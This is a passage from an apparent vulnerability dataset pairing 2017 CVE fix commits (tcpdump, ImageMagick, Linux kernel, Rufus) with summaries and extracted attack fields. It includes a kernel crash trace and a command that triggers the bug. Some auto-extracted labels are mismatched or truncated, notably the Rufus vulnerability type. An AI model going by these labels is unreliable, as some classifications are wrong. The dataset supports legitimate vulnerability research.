attacker"},{"commit_id":"8dca25d26c7ca2caf6138267f6f17111212c156e","cve_id":"CVE-2017-13690","cwe_id":"CWE-125","commit_message":"CVE-2017-13690\/IKEv2: Fix some bounds checks.\n\nUse a pointer of the correct type in ND_TCHECK(), or use ND_TCHECK2()\nand provide the correct length.\n\nWhile we're at it, remove the blank line between some checks and the\nUNALIGNED_MEMCPY()s they protect.\n\nAlso, note the places where we print the entire payload.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The IKEv2 parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c, several functions.","commit_message_1":"fix some bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"0cb1b8a434b599b8d636db029aadb757c24e39d6","cve_id":"CVE-2017-13688","cwe_id":"CWE-125","commit_message":"CVE-2017-13688\/OLSR: Do bounds checks before we fetch data.\n\nWhile we're at it, clean up some other bounds checks, so we check that\nwe have a complete IPv4 message header if it's IPv4 and a complete IPv6\nmessage header if it's IPv6.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The OLSR parser in tcpdump before 4.9.2 has a buffer over-read in print-olsr.c:olsr_print().","commit_message_1":"do bound check before we fetch data","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"bc3aae2bbac46dd894c89db5d5e98f7f0ef9e205","cve_id":"CVE-2017-13686","cwe_id":"CWE-476","commit_message":"net: check and errout if res->fi is NULL when RTM_F_FIB_MATCH is set\n\nSyzkaller hit 'general protection fault in fib_dump_info' bug on\ncommit 4.13-rc5..\n\nGuilty file: net\/ipv4\/fib_semantics.c\n\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN\nModules linked in:\nCPU: 0 PID: 2808 Comm: syz-executor0 Not tainted 4.13.0-rc5 #1\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS\nUbuntu-1.8.2-1ubuntu1 04\/01\/2014\ntask: ffff880078562700 task.stack: ffff880078110000\nRIP: 0010:fib_dump_info+0x388\/0x1170 net\/ipv4\/fib_semantics.c:1314\nRSP: 0018:ffff880078117010 EFLAGS: 00010206\nRAX: dffffc0000000000 RBX: 00000000000000fe RCX: 0000000000000002\nRDX: 0000000000000006 RSI: ffff880078117084 RDI: 0000000000000030\nRBP: ffff880078117268 R08: 000000000000000c R09: ffff8800780d80c8\nR10: 0000000058d629b4 R11: 0000000067fce681 R12: 0000000000000000\nR13: ffff8800784bd540 R14: ffff8800780d80b5 R15: ffff8800780d80a4\nFS:  00000000022fa940(0000) GS:ffff88007fc00000(0000)\nknlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00000000004387d0 CR3: 0000000079135000 CR4: 00000000000006f0\nCall Trace:\n  inet_rtm_getroute+0xc89\/0x1f50 net\/ipv4\/route.c:2766\n  rtnetlink_rcv_msg+0x288\/0x680 net\/core\/rtnetlink.c:4217\n  netlink_rcv_skb+0x340\/0x470 net\/netlink\/af_netlink.c:2397\n  rtnetlink_rcv+0x28\/0x30 net\/core\/rtnetlink.c:4223\n  netlink_unicast_kernel net\/netlink\/af_netlink.c:1265 [inline]\n  netlink_unicast+0x4c4\/0x6e0 net\/netlink\/af_netlink.c:1291\n  netlink_sendmsg+0x8c4\/0xca0 net\/netlink\/af_netlink.c:1854\n  sock_sendmsg_nosec net\/socket.c:633 [inline]\n  sock_sendmsg+0xca\/0x110 net\/socket.c:643\n  ___sys_sendmsg+0x779\/0x8d0 net\/socket.c:2035\n  __sys_sendmsg+0xd1\/0x170 net\/socket.c:2069\n  SYSC_sendmsg net\/socket.c:2080 [inline]\n  SyS_sendmsg+0x2d\/0x50 net\/socket.c:2076\n  entry_SYSCALL_64_fastpath+0x1a\/0xa5\n  RIP: 0033:0x4512e9\n  RSP: 002b:00007ffc75584cc8 EFLAGS: 00000216 ORIG_RAX:\n  000000000000002e\n  RAX: ffffffffffffffda RBX: 0000000000000002 RCX: 00000000004512e9\n  RDX: 0000000000000000 RSI: 0000000020f2cfc8 RDI: 0000000000000003\n  RBP: 000000000000000e R08: 0000000000000000 R09: 0000000000000000\n  R10: 0000000000000000 R11: 0000000000000216 R12: fffffffffffffffe\n  R13: 0000000000718000 R14: 0000000020c44ff0 R15: 0000000000000000\n  Code: 00 0f b6 8d ec fd ff ff 48 8b 85 f0 fd ff ff 88 48 17 48 8b 45\n  28 48 8d 78 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03\n  <0f>\n  b6 04 02 84 c0 74 08 3c 03 0f 8e cb 0c 00 00 48 8b 45 28 44\n  RIP: fib_dump_info+0x388\/0x1170 net\/ipv4\/fib_semantics.c:1314 RSP:\n  ffff880078117010\n---[ end trace 254a7af28348f88b ]---\n\nThis patch adds a res->fi NULL check.\n\nexample run:\n$ip route get 0.0.0.0 iif virt1-0\nbroadcast 0.0.0.0 dev lo\n    cache <local,brd> iif virt1-0\n\n$ip route get 0.0.0.0 iif virt1-0 fibmatch\nRTNETLINK answers: No route to host\n\nReported-by: idaifish <idaifish@gmail.com>\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nFixes: b61798130f1b (\"net: ipv4: RTM_GETROUTE: return matched fib result when requested\")\nSigned-off-by: Roopa Prabhu <roopa@cumulusnetworks.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/ipv4\/route.c in the Linux kernel 4.13-rc1 through 4.13-rc6 is too late to check for a NULL fi field when RTM_F_FIB_MATCH is set, which allows local users to cause a denial of service (NULL pointer dereference) or possibly have unspecified other impact via crafted system calls. NOTE: this does not affect any stable release.","commit_message_1":"check and errout if res- > fi is null when rtm_f_fib_match is set syzkaller hit 'general protection fault in fib_dump_info ' bug on commit <file>-rc5","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via crafted system calls","Impact":"cause a denial of service ( pointer dereference ) or possibly have unspecified other","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"e5c063a1007506ba69e97a35effcdef944421c89","cve_id":"CVE-2017-13658","cwe_id":"CWE-617","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/598","summary":"In ImageMagick before 6.9.9-3 and 7.x before 7.0.6-3, there is a missing NULL check in the ReadMATImage function in coders\/mat.c, leading to a denial of service (assertion failure and application exit) in the DestroyImageInfo function in MagickCore\/image.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Reachable Assertion","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an assertion failure","Attack Type":"remote attacker"},{"commit_id":"b0c5222ce31e8f941fa02ff9c7a040fb2db30dbc","cve_id":"CVE-2017-13145","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/501","summary":"In ImageMagick before 6.9.8-8 and 7.x before 7.0.5-9, the ReadJP2Image function in coders\/jp2.c does not properly validate the channel geometry, leading to a crash.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by improper validation of channel geometry","Attack Type":"remote attacker"},{"commit_id":"51b0ae01709adc1e4a9245e158ef17b85a110960","cve_id":"CVE-2017-13143","cwe_id":"CWE-200","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/362","summary":"In ImageMagick before 6.9.7-6 and 7.x before 7.0.4-6, the ReadMATImage function in coders\/mat.c uses uninitialized data, which might allow remote attackers to obtain sensitive information from process memory.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"obtain sensitive information from process memory","Root Cause":"uses uninitialized data","Attack Type":"remote attacker"},{"commit_id":"22e0310345499ffe906c604428f2a3a668942b05","cve_id":"CVE-2017-13139","cwe_id":"CWE-125","commit_message":"Fix potential out-of-bounds read with the MNG CLIP chunk.","summary":"In ImageMagick before 6.9.9-0 and 7.x before 7.0.6-1, the ReadOneMNGImage function in coders\/png.c has an out-of-bounds read with the MNG CLIP chunk.","commit_message_1":"fix potential out-of-bounds read with the mng clip chunk","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"c has an out - of - bounds read with the mng clip chunk","Attack Type":"remote attacker"},{"commit_id":"c3c39f7f8a11f612c4ebf7affce25ec6928eb1cb","cve_id":"CVE-2017-13083","cwe_id":"CWE-494","commit_message":"[pki] fix https:\/\/www.kb.cert.org\/vuls\/id\/403768\n\n* This commit effectively fixes https:\/\/www.kb.cert.org\/vuls\/id\/403768 (CVE-2017-13083) as\n  it is described per its revision 11, which is the latest revision at the time of this commit,\n  by disabling Windows prompts, enacted during signature validation, that allow the user to\n  bypass the intended signature verification checks.\n* It needs to be pointed out that the vulnerability (\"allow(ing) the use of a self-signed\n  certificate\"), which relies on the end-user actively ignoring a Windows prompt that tells\n  them that the update failed the signature validation whilst also advising against running it,\n  is being fully addressed, even as the update protocol remains HTTP.\n* It also need to be pointed out that the extended delay (48 hours) between the time the\n  vulnerability was reported and the moment it is fixed in our codebase has to do with\n  the fact that the reporter chose to deviate from standard security practices by not\n  disclosing the details of the vulnerability with us, be it publicly or privately,\n  before creating the cert.org report. The only advance notification we received was a\n  generic note about the use of HTTP vs HTTPS, which, as have established, is not\n  immediately relevant to addressing the reported vulnerability.\n* Closes #1009\n* Note: The other vulnerability scenario described towards the end of #1009, which\n  doesn't have to do with the \"lack of CA checking\", will be addressed separately.","summary":"Akeo Consulting Rufus prior to version 2.17.1187 does not adequately validate the integrity of updates downloaded over HTTP, allowing an attacker to easily convince a user to execute arbitrary code","commit_message_1":"* this commit effectively fix http : \/\/<file>","Vulnerability Type":"Omitted Break Statement in Switch","Attack Vector":"caused by the failure to perform signature checking of updates","Impact":"easily convince a user to execute arbitrary code","Root Cause":"does not adequately validate the integrity of updates downloaded over http","Attack Type":"remote attacker"},{"commit_id":"5d0d76e88ee2d3236d7e032589d6f1d4ec5f7b1e","cve_id":"CVE-2017-13055","cwe_id":"CWE-125","commit_message":"CVE-2017-13055\/IS-IS: fix an Extended IS Reachability sub-TLV\n\nIn isis_print_is_reach_subtlv() one of the case blocks did not check that\nthe sub-TLV \"V\" is actually present and could over-read the input buffer.\nAdd a length check to fix that and remove a useless boundary check from\na loop because the boundary is tested for the full length of \"V\" before\nthe switch block.\n\nUpdate one of the prior test cases as it turns out it depended on this\npreviously incorrect code path to make it to its own malformed structure\nfurther down the buffer, the bugfix has changed its output.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The ISO IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print_is_reach_subtlv().","commit_message_1":"fix an extended is reachability sub-tlv in isis_print_is_reach_subtlv ( ) one of the case block did not check that the sub-tlv `` v '' is actually present and could over-read the input buffer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"caused by a buffer overread memory","Attack Type":"remote attacker"},{"commit_id":"e6511cc1a950fe1566b2236329d6b4bd0826cc7a","cve_id":"CVE-2017-13054","cwe_id":"CWE-125","commit_message":"CVE-2017-13054\/LLDP: add a missing length check\n\nIn lldp_private_8023_print() the case block for subtype 4 (Maximum Frame\nSize TLV, IEEE 802.3bc-2009 Section 79.3.4) did not include the length\ncheck and could over-read the input buffer, put it right.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The LLDP parser in tcpdump before 4.9.2 has a buffer over-read in print-lldp.c:lldp_private_8023_print().","commit_message_1":"add a missing length check in lldp_private_8023_print ( ) the case block for subtype <number> ( maximum frame size tlv , ieee <file>-<number> section <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"bd4e697ebd6c8457efa8f28f6831fc929b88a014","cve_id":"CVE-2017-13053","cwe_id":"CWE-125","commit_message":"CVE-2017-13053\/BGP: fix VPN route target bounds checks\n\ndecode_rt_routing_info() didn't check bounds before fetching 4 octets of\nthe origin AS field and could over-read the input buffer, put it right.\n\nIt also fetched the varying number of octets of the route target field\nfrom 4 octets lower than the correct offset, put it right.\n\nIt also used the same temporary buffer explicitly through as_printf()\nand implicitly through bgp_vpn_rd_print() so the end result of snprintf()\nwas not what was originally intended.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:decode_rt_routing_info().","commit_message_1":"fix vpn route target bound check decode_rt_routing_info ( ) did n't check bound before fetching <number> octet of the origin a field and could over-read the input buffer , put it right","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"5d340a5ca6e420a70297cdbdf777333f18bfdab7","cve_id":"CVE-2017-13052","cwe_id":"CWE-125","commit_message":"CVE-2017-13052\/CFM: refine decoding of the Sender ID TLV\n\nIn cfm_network_addr_print() add a length argument and use it to validate\nthe input buffer.\n\nIn cfm_print() add a length check for MAC address chassis ID. Supply\ncfm_network_addr_print() with the length of its buffer and a correct\npointer to the buffer (it was off-by-one before). Change some error\nhandling blocks to skip to the next TLV in the current PDU rather than to\nstop decoding the PDU. Print the management domain and address contents,\nalthough in hex only so far.\n\nAdd some comments to clarify the code flow and to tell exact sections in\nIEEE standard documents. Add new error messages and make some existing\nmessages more specific.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The CFM parser in tcpdump before 4.9.2 has a buffer over-read in print-cfm.c:cfm_print().","commit_message_1":"refine decoding of the sender id tlv in cfm_network_addr_print ( ) add a length argument and use it to validate the input buffer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"289c672020280529fd382f3502efab7100d638ec","cve_id":"CVE-2017-13051","cwe_id":"CWE-125","commit_message":"CVE-2017-13051\/RSVP: fix bounds checks for UNI\n\nFixup the part of rsvp_obj_print() that decodes the GENERALIZED_UNI\nobject from RFC 3476 Section 3.1 to check the sub-objects inside that\nobject more thoroughly.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The RSVP parser in tcpdump before 4.9.2 has a buffer over-read in print-rsvp.c:rsvp_obj_print().","commit_message_1":"fix bound check for uni fixup the part of rsvp_obj_print ( ) that decodes the generalized_uni object from rfc <number> section <file> to check the sub-objects inside that object more thoroughly","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"83c64fce3a5226b080e535f5131a8a318f30e79b","cve_id":"CVE-2017-13050","cwe_id":"CWE-125","commit_message":"CVE-2017-13050\/RPKI-Router: fix a few bugs\n\nThe decoder didn't properly check that the PDU length stored in the PDU\nheader is correct. The only check in place was in rpki_rtr_print() and it\ntested whether the length is zero but that is not sufficient. Make all\nnecessary length and bounds checks, both generic and type-specific, in\nrpki_rtr_pdu_print() and reduce rpki_rtr_print() to a simple loop.\n\nThis also fixes a minor bug and PDU type 0 (Serial Notify from RFC 6810\nSection 5.2) is valid again.\n\nIn rpki_rtr_pdu_print() any protocol version was considered version 0,\nfix it to skip the rest of input if the PDU protocol version is unknown.\n\nIbid, the PDU type 10 (Error Report from RFC 6810 Section 5.10) case\nblock didn't consider the \"Length of Error Text\" data element mandatory,\nput it right.\n\nIbid, when printing an encapsulated PDU, give itself (via recursion)\nrespective buffer length to make it possible to tell whether the\nencapsulated PDU fits. Do not recurse deeper than 2nd level.\n\nUpdate prior RPKI-Router test cases that now stop to decode earlier\nbecause of the stricter checks.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The RPKI-Router parser in tcpdump before 4.9.2 has a buffer over-read in print-rpki-rtr.c:rpki_rtr_pdu_print().","commit_message_1":"fix a few bug the decoder did n't properly check that the pdu length stored in the pdu header is correct","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"aa0858100096a3490edf93034a80e66a4d61aad5","cve_id":"CVE-2017-13049","cwe_id":"CWE-125","commit_message":"CVE-2017-13049\/Rx: add a missing bounds check for Ubik\n\nOne of the case blocks in ubik_print() didn't check bounds before\nfetching 32 bits of packet data and could overread past the captured\npacket data by that amount.\n\nThis fixes a buffer over-read discovered by Henri Salo from Nixu\nCorporation.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The Rx protocol parser in tcpdump before 4.9.2 has a buffer over-read in print-rx.c:ubik_print().","commit_message_1":"add a missing bound check for ubik one of the case block in ubik_print ( ) did n't check bound before fetching <number> bit of packet data and could overread past the captured packet data by that amount","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"3c8a2b0e91d8d8947e89384dacf6b54673083e71","cve_id":"CVE-2017-13048","cwe_id":"CWE-125","commit_message":"CVE-2017-13048\/RSVP: fix decoding of Fast Reroute objects\n\nIn rsvp_obj_print() the case block for Class-Num 205 (FAST_REROUTE) from\nRFC 4090 Section 4.1 could over-read accessing the buffer contents before\nmaking the bounds check. Rearrange those steps the correct way around.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The RSVP parser in tcpdump before 4.9.2 has a buffer over-read in print-rsvp.c:rsvp_obj_print().","commit_message_1":"fix decoding of fast reroute object in rsvp_obj_print ( ) the case block for class-num <number> ( fast_reroute ) from rfc <number> section <file> could over-read accessing the buffer content before making the bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"331530a4076c69bbd2e3214db6ccbe834fb75640","cve_id":"CVE-2017-13047","cwe_id":"CWE-125","commit_message":"CVE-2017-13047\/ES-IS: put an existing bounds check right\n\nThe bounds check in esis_print() tested one pointer at the beginning of\na loop that incremented another, make the trivial fix. While at it, make\nthe function print a standard marker when it detects truncated data and\nupdate some existing ES-IS tests respectively.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The ISO ES-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:esis_print().","commit_message_1":"put an existing bound check right the bound check in esis_print ( ) tested one pointer at the beginning of a loop that incremented another , make the trivial fix","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over","Attack Type":"remote attacker"},{"commit_id":"d10a0f980fe8f9407ab1ffbd612641433ebe175e","cve_id":"CVE-2017-13046","cwe_id":"CWE-125","commit_message":"CVE-2017-13046\/BGP: fix an existing bounds check for PMSI Tunnel\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().","commit_message_1":"fix an existing bound check for pmsi tunnel this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"3b36ec4e713dea9266db11975066c425aa669b6c","cve_id":"CVE-2017-13045","cwe_id":"CWE-125","commit_message":"CVE-2017-13045\/VQP: add some bounds checks\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The VQP parser in tcpdump before 4.9.2 has a buffer over-read in print-vqp.c:vqp_print().","commit_message_1":"add some bound check this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"c2f6833dddecf2d5fb89c9c898eee9981da342ed","cve_id":"CVE-2017-13044","cwe_id":"CWE-125","commit_message":"CVE-2017-13044\/HNCP: add DHCPv4-Data bounds checks\n\ndhcpv4_print() in print-hncp.c had the same bug as dhcpv6_print(), apply\na fix along the same lines.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The HNCP parser in tcpdump before 4.9.2 has a buffer over-read in print-hncp.c:dhcpv4_print().","commit_message_1":"add dhcpv4-data bound check dhcpv4_print ( ) in print-<file> had the same bug a dhcpv6_print ( ) , apply a fix along the same line","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"d515b4b4a300479cdf1a6e0d1bb95bc1f9fee514","cve_id":"CVE-2017-13043","cwe_id":"CWE-125","commit_message":"CVE-2017-13043\/BGP: fix decoding of MVPN route types 6 and 7\n\nRFC 6514 Section 4.6 defines the structure for Shared Tree Join (6) and\nSource Tree Join (7) multicast VPN route types. decode_multicast_vpn()\ndidn't implement the Source AS field of that structure properly, adjust\nthe offsets to put it right.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:decode_multicast_vpn().","commit_message_1":"fix decoding of mvpn route type <number> and <number> rfc <number> section <file> defines the structure for shared tree join ( <number> ) and source tree join ( <number> ) multicast vpn route type","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"39582c04cc5e34054b2936b423072fb9df2ff6ef","cve_id":"CVE-2017-13042","cwe_id":"CWE-125","commit_message":"CVE-2017-13042\/HNCP: add DHCPv6-Data bounds checks\n\nhncp_print_rec() validates each HNCP TLV to be within the declared as\nwell as the on-the-wire packet space. However, dhcpv6_print() in the same\nfile didn't do the same for the DHCPv6 options within the HNCP\nDHCPv6-Data TLV value, which could cause an out-of-bounds read when\ndecoding an invalid packet. Add missing checks to dhcpv6_print().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The HNCP parser in tcpdump before 4.9.2 has a buffer over-read in print-hncp.c:dhcpv6_print().","commit_message_1":"add dhcpv6-data bound check hncp_print_rec ( ) validates each hncp tlv to be within the declared a well a the on-the-wire packet space","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"f4b9e24c7384d882a7f434cc7413925bf871d63e","cve_id":"CVE-2017-13041","cwe_id":"CWE-125","commit_message":"CVE-2017-13041\/ICMP6: Add more bounds checks.\n\nThis fixes a buffer over-read discovered by Kim Gwan Yeong.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_nodeinfo_print().","commit_message_1":"add more bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"4c3aee4bb0294c232d56b6d34e9eeb74f630fe8c","cve_id":"CVE-2017-13040","cwe_id":"CWE-125","commit_message":"CVE-2017-13040\/MPTCP: Clean up printing DSS suboption.\n\nDo the length checking inline; that means we print stuff up to the point\nat which we run out of option data.\n\nFirst check to make sure we have at least 4 bytes of option, so we have\nflags to check.\n\nThis fixes a buffer over-read discovered by Kim Gwan Yeong.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The MPTCP parser in tcpdump before 4.9.2 has a buffer over-read in print-mptcp.c, several functions.","commit_message_1":"clean up printing ds suboption","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"e0a5a02b0fc1900a69d6c37ed0aab36fb8494e6d","cve_id":"CVE-2017-13039","cwe_id":"CWE-125","commit_message":"CVE-2017-13039\/IKEv1: Do more bounds checking.\n\nHave ikev1_attrmap_print() and ikev1_attr_print() do full bounds\nchecking, and return null on a bounds overflow.  Have their callers\ncheck for a null return.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The ISAKMP parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c, several functions.","commit_message_1":"do more bound checking","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"7335163a6ef82d46ff18f3e6099a157747241629","cve_id":"CVE-2017-13038","cwe_id":"CWE-125","commit_message":"CVE-2017-13038\/PPP: Do bounds checking.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd a test using the capture file supplied by Katie Holly.","summary":"The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:handle_mlppp().","commit_message_1":"do bound checking","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"2c2cfbd2b771ac888bc5c4a6d922f749d3822538","cve_id":"CVE-2017-13037","cwe_id":"CWE-125","commit_message":"CVE-2017-13037\/IP: Add bounds checks when printing time stamp options.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The IP parser in tcpdump before 4.9.2 has a buffer over-read in print-ip.c:ip_printts().","commit_message_1":"add bound check when printing time stamp option","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"88b2dac837e81cf56dce05e6e7b5989332c0092d","cve_id":"CVE-2017-13036","cwe_id":"CWE-125","commit_message":"CVE-2017-13036\/OSPFv3: Add a bounds check before fetching data\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The OSPFv3 parser in tcpdump before 4.9.2 has a buffer over-read in print-ospf6.c:ospf6_decode_v3().","commit_message_1":"add a bound check before fetching data this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"571a6f33f47e7a2394fa08f925e534135c29cf1e","cve_id":"CVE-2017-13035","cwe_id":"CWE-125","commit_message":"CVE-2017-13035\/Properly handle IS-IS IDs shorter than a system ID (MAC address).\n\nSome of them are variable-length, with a field giving the total length,\nand therefore they can be shorter than 6 octets.  If one is, don't run\npast the end.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.","summary":"The ISO IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print_id().","commit_message_1":"<cve_id>\/properly handle is-is id shorter than a system id ( mac address )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer","Attack Type":"remote attacker"},{"commit_id":"da6f1a677bfa4476abaeaf9b1afe1c4390f51b41","cve_id":"CVE-2017-13034","cwe_id":"CWE-125","commit_message":"CVE-2017-13034\/PGM: Add a bounds check.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), 